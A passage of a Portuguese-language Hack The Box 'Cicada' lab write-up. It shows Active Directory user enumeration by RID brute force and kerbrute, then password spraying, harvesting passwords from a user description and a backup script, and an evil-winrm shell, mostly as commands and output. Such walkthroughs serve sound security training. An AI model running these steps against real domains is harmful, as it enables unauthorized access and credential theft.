+<p>Agora temos uma possível senha para algum usuário, mas ainda não sabemos nenhum usuário do sistema, podemos usar a técnica de <code>brute-rid</code> para ver possíveis usuários do sistema e validar com o Kerberos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  nxc smb 10.10.11.35  -u <span style="color:#e6db74">&#34;guest&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> --rid-brute
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\g</span>uest:
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        498: CICADA<span style="color:#ae81ff">\E</span>nterprise Read-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        500: CICADA<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        501: CICADA<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        502: CICADA<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        512: CICADA<span style="color:#ae81ff">\D</span>omain Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        513: CICADA<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        514: CICADA<span style="color:#ae81ff">\D</span>omain Guests <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        515: CICADA<span style="color:#ae81ff">\D</span>omain Computers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        516: CICADA<span style="color:#ae81ff">\D</span>omain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        517: CICADA<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        518: CICADA<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        519: CICADA<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        520: CICADA<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        521: CICADA<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        522: CICADA<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        525: CICADA<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        526: CICADA<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        527: CICADA<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        553: CICADA<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        571: CICADA<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        572: CICADA<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1000: CICADA<span style="color:#ae81ff">\C</span>ICADA-DC$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1101: CICADA<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1102: CICADA<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1103: CICADA<span style="color:#ae81ff">\G</span>roups <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1104: CICADA<span style="color:#ae81ff">\j</span>ohn.smoulder <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1105: CICADA<span style="color:#ae81ff">\s</span>arah.dantelia <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1106: CICADA<span style="color:#ae81ff">\m</span>ichael.wrightson <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1108: CICADA<span style="color:#ae81ff">\d</span>avid.orelious <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1109: CICADA<span style="color:#ae81ff">\D</span>ev Support <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span></span></span></code></pre></div><p>Com isso podemos montar uma wordlist com os usuários e validar o login usando o Kerbrute</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ cat creds.txt
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>Guest
+</span></span><span style="display:flex;"><span>krbtgt
+</span></span><span style="display:flex;"><span>john.smoulder
+</span></span><span style="display:flex;"><span>sarah.dantelia
+</span></span><span style="display:flex;"><span>michael.wrightson
+</span></span><span style="display:flex;"><span>david.orelious
+</span></span><span style="display:flex;"><span>emily.oscars
+</span></span><span style="display:flex;"><span>➜ kerbrute userenum -d cicada.htb --dc 10.10.11.35 creds.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 02/15/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;   10.10.11.35:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       john.smoulder@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       sarah.dantelia@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Administrator@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Guest@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       david.orelious@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       emily.oscars@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       michael.wrightson@cicada.htb
+</span></span><span style="display:flex;"><span>2025/02/15 18:28:55 &gt;  Done! Tested <span style="color:#ae81ff">8</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> valid<span style="color:#f92672">)</span> in 0.207 seconds</span></span></code></pre></div><p>Agora temos uma senha e uma lista de usuários do sistema, no contexto atual o que podemos fazer é testar se algum desses usuários utiliza essa senha fazendo um <code>password spray</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  nxc smb 10.10.11.35  -u creds.txt -p <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --continue-on-success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\A</span>dministrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\G</span>uest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\j</span>ohn.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\s</span>arah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\m</span>ichael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\d</span>avid.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\e</span>mily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE</span></span></code></pre></div><p>Conseguimos uma credencial <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code> .</p>
+<p>Podemos testar os acessos dele no SMB também e ver se temos algo diferente lá, porém ele não tem acesso a nenhum diretório diferente de antes. </p>
+<p>Tento essas credenciais para realizar login na máquina, com o <code>evil-winrm</code>, porém sem sucesso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ evil-winrm -u michael.wrightson  -p <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> -i 10.10.11.35
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimpleme
+</span></span><span style="display:flex;"><span>nted on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completi
+</span></span><span style="display:flex;"><span>on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Error: Exiting with code <span style="color:#ae81ff">1</span></span></span></code></pre></div><p>Podemos tentar enumerar outros usuários com esse acesso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  nxc smb 10.10.11.35  -u <span style="color:#e6db74">&#34;michael.wrightson&#34;</span> -p <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> --users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\m</span>ichael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Desc
+</span></span><span style="display:flex;"><span>ription-
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Administrator                 2024-08-26 20:08:03 <span style="color:#ae81ff">2</span>       Built
+</span></span><span style="display:flex;"><span>-in account <span style="color:#66d9ef">for</span> administering the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Guest                         2024-08-28 17:26:56 <span style="color:#ae81ff">2</span>       Built
+</span></span><span style="display:flex;"><span>-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        krbtgt                        2024-03-14 11:14:10 <span style="color:#ae81ff">0</span>       Key D
+</span></span><span style="display:flex;"><span>istribution Center Service Account
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        david.orelious                2024-03-14 12:17:29 <span style="color:#ae81ff">2</span>       Just in <span style="color:#66d9ef">case</span> I forget my password is aRt$Lp<span style="color:#75715e">#7t*VQ!3</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated <span style="color:#ae81ff">8</span> local users: CICADA</span></span></code></pre></div><p>Na descrição de <code>david.orelious</code> a senha é vazada: <code>aRt$Lp#7t*VQ!3</code>.</p>
+<p>Tento novamente um login via <code>evil-winrm</code>, porém sem sucesso também.</p>
+<p>Com esse acesso temos acesso a um novo diretório no SMB:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ nxc smb 10.10.11.35 -u david.orelious -p <span style="color:#e6db74">&#39;aRt$Lp#7t*VQ!3&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domai
+</span></span><span style="display:flex;"><span>n:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\d</span>avid.orelious:aRt$Lp<span style="color:#75715e">#7t*VQ!3</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        DEV             READ
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        HR              READ
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        NETLOGON        READ            Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.10.11.35     <span style="color:#ae81ff">445</span>    CICADA-DC        SYSVOL          READ            Logon server share</span></span></code></pre></div><p>Nesse diretório DEV temos um script de backup para windows, quando baixamos e vemos o código fonte, vemos a credencial de outro usuário gravada no código e conseguimos um novo acesos, <code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ smbclient //10.10.11.35/DEV -U david.orelious
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\d</span>avid.orelious<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:31:39 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  Backup_script.ps1                   A      <span style="color:#ae81ff">601</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:28:22 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">395259</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Backup_script.ps1
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\B</span>ackup_script.ps1 of size <span style="color:#ae81ff">601</span> as Backup_script.ps1 <span style="color:#f92672">(</span>0.6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ^C
+</span></span><span style="display:flex;"><span>➜ cat Backup_script.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sourceDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:\smb&#34;</span>
+</span></span><span style="display:flex;"><span>$destinationDirectory <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;D:\Backup&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;emily.oscars&#34;</span>
+</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$credentials <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span>$username, $password<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$dateStamp <span style="color:#f92672">=</span> Get-Date -Format <span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>
+</span></span><span style="display:flex;"><span>$backupFileName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;smb_backup_</span>$dateStamp<span style="color:#e6db74">.zip&#34;</span>
+</span></span><span style="display:flex;"><span>$backupFilePath <span style="color:#f92672">=</span> Join-Path -Path $destinationDirectory -ChildPath $backupFileName
+</span></span><span style="display:flex;"><span>Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Backup completed successfully. Backup file saved to: </span>$backupFilePath<span style="color:#e6db74">&#34;</span></span></span></code></pre></div><p>E com essas credenciais, o login via <code>evil-winrm</code> finalmente funciona:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜ evil-winrm -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span> -i 10.10.11.35
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimpleme
+</span></span><span style="display:flex;"><span>nted on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completi
+</span></span><span style="display:flex;"><span>on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\e</span>mily.oscars.CICADA<span style="color:#ae81ff">\D</span>ocuments&gt;</span></span></code></pre></div><figure><img src="/assets/image%20%28191%29.png">
+</figure>
